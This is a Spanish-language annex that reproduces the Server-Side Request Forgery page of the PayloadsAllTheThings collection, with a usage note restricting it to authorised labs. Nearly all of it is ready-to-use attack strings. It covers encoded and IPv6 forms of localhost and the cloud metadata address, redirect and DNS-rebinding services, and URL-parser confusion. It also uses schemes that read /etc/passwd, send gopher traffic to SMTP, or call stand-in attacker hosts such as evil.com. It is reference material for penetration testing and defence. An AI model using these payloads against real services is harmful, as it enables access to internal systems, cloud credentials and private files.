# Server-Side Request Forgery (SSRF): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Request Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Request%20Forgery/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Server-Side Solicitud Forgery / Metodología

```py
url = input("Enter URL:")
response = requests.get(url)
return response
```

```ps1
http://169.254.169.254/latest/meta-data/
```

## 2. Bypassing Filters / Default Targets

```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
```

```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
```

```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
```

### Variantes presentes en tablas o texto del apartado

```text
127.0.0.1
0.0.0.0
```

## 3. Bypassing Filters / Evasión Localhost Con IPv6 Notation

```powershell
    http://[::]:80/
```

```powershell
    http://[0000::1]:80/
```

```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
```

### Variantes presentes en tablas o texto del apartado

```text
[::]
[0000::1]
```

## 4. Bypassing Filters / Evasión Localhost Con a Domain Redirect

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### Variantes presentes en tablas o texto del apartado

```text
::1
127.0.0.1
nip.io
```

## 5. Bypassing Filters / Evasión Localhost Con CIDR

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Variantes presentes en tablas o texto del apartado

```text
127.0.0.0/8
```

## 6. Bypassing Filters / Evasión Usando Rare Address

```powershell
http://0/
http://127.1
http://127.0.1
```

## 7. Bypassing Filters / Evasión Usando an Encoded IP Address

```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
```

```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
```

```powershell
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
```

## 8. Bypassing Filters / Evasión Usando Diferentes Codificación

```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
```

```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

### Variantes presentes en tablas o texto del apartado

```text
\d
0123456789
๐๑๒๓๔๕๖๗๘๙
```

## 9. Bypassing Filters / Bypassing via ipv6 hostname

```powershell
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
```

### Variantes presentes en tablas o texto del apartado

```text
::1   localhost ip6-localhost ip6-loopback
```

## 10. Bypassing Filters / Bypassing Usando a Redirect

```powershell
    https://307.r3dir.me/--to/?url=http://localhost
```

```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
```

### Variantes presentes en tablas o texto del apartado

```text
vulnerable.com/index.php?url=http://redirect-server
http://localhost
http://169.254.169.254/latest/meta-data/
302 Found
```

## 11. Bypassing Filters / Evasión Usando Revinculación DNS

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### Variantes presentes en tablas o texto del apartado

```text
1.2.3.4
169.254-169.254
```

## 12. Bypassing Filters / Evasión Abusing URL Parsing Discrepancy

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

### Variantes presentes en tablas o texto del apartado

```text
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2
1.1.1.1
2.2.2.2
3.3.3.3
http:127.0.0.1/
http://127.0.0.1/
```

## 13. Bypassing Filters / Evasión PHP filter_var() Function

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### Variantes presentes en tablas o texto del apartado

```text
filter_var()
FILTER_VALIDATE_URL
http://test???test.com
0://evil.com:80;http://google.com:80/
```

## 14. Bypassing Filters / Evasión Usando TLD localhost

```powershell
$ ping PayloadsAllTheThings.localhost -c 1
PING PayloadsAllTheThings.localhost (::1) 56 data bytes
64 bytes from ip6-localhost (::1): icmp_seq=1 ttl=64 time=0.070 ms

--- PayloadsAllTheThings.localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms
```

### Variantes presentes en tablas o texto del apartado

```text
.localhost
```

## 15. Bypassing Filters / Evasión Usando JAR Scheme

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## 16. Exploitation via URL Scheme / Archivo

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

## 17. Exploitation via URL Scheme / HTTP

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

## 18. Exploitation via URL Scheme / Dict

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

## 19. Exploitation via URL Scheme / SFTP

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

## 20. Exploitation via URL Scheme / TFTP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

## 21. Exploitation via URL Scheme / LDAP

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

## 22. Exploitation via URL Scheme / Netdoc

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### Variantes presentes en tablas o texto del apartado

```text
\n
\r
```

## 23. Exploitation via URL Scheme / Gopher

```ps1
gopher://[host]:[port]/[type][selector]
```

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

### Variantes presentes en tablas o texto del apartado

```text
gopher://
```

## 24. Server-Side Solicitud Forgery / Upgrade to XSS

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
